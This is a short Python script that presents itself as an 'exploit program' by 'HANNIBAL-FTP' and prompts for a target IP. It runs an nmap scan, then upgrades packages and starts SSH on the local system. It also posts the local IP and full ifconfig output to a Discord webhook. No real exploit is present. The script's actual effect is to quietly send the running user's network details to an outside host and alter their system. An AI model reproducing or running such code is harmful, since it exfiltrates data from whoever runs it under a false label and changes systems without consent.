import os
import requests
import socket
print(r"""FFFFFFFFFFFFFFFFFFFFFFTTTTTTTTTTTTTTTTTTTTTTTPPPPPPPPPPPPPPPPP   
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::::::::::::P  
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::PPPPPP:::::P 
FF::::::FFFFFFFFF::::FT:::::TT:::::::TT:::::TPP:::::P     P:::::P
  F:::::F       FFFFFFTTTTTT  T:::::T  TTTTTT  P::::P     P:::::P
  F:::::F                     T:::::T          P::::P     P:::::P
  F::::::FFFFFFFFFF           T:::::T          P::::PPPPPP:::::P 
  F:::::::::::::::F           T:::::T          P:::::::::::::PP  
  F:::::::::::::::F           T:::::T          P::::PPPPPPPPP    
  F::::::FFFFFFFFFF           T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
FF:::::::FF                 TT:::::::TT      PP::::::PP          
F::::::::FF                 T:::::::::T      P::::::::P          
F::::::::FF                 T:::::::::T      P::::::::P          
FFFFFFFFFFF                 TTTTTTTTTTT      PPPPPPPPPP""") 
print(r'best exploit program by HANNIBAL-FTP')
print()
print()

#  add your WEBHOOK_URL down
WEBHOOK_URL = 'https://discord.com/api/your_webhook'

def get_system_ip():
    # Get the system's IP address
    system_ip = socket.gethostbyname(socket.gethostname())
    return system_ip

def send_ip_to_webhook(ip):
    # Create a payload with the IP address
    payload = {'content': f'System IP Address: {ip}'}

    # Send the payload to the Discord webhook
    requests.post(WEBHOOK_URL, data=payload)

def vulnerability(target_ip):
    # Run a port scan using nmap
    os.system(f"nmap {target_ip}")

    # Update the system (adjust for non-Debian systems)
    os.system("apt update && apt upgrade -y")

    # Start the SSH service
    os.system("sudo systemctl start sshd.service")

    # List open ports
    os.system("netstat -t")

    # Now check for specific open ports
    open_ports = [134, 139, 445, 22, 53, 25, 3389, 80, 443, 8080, 8443, 20, 21, 23, 1433, 1434, 3306]

    for port in open_ports:
        os.system(f"sudo netstat -na | grep :{port}")

    # Get system information using ipconfig
    data = os.popen("ifconfig").read()
    requests.post(WEBHOOK_URL, data={'content': data})

# Get the target IP from user input
target_ip = input("Enter the target IP: ")
vulnerability(target_ip)

# Get the system IP and send it to the webhook
system_ip = get_system_ip()
send_ip_to_webhook(system_ip)
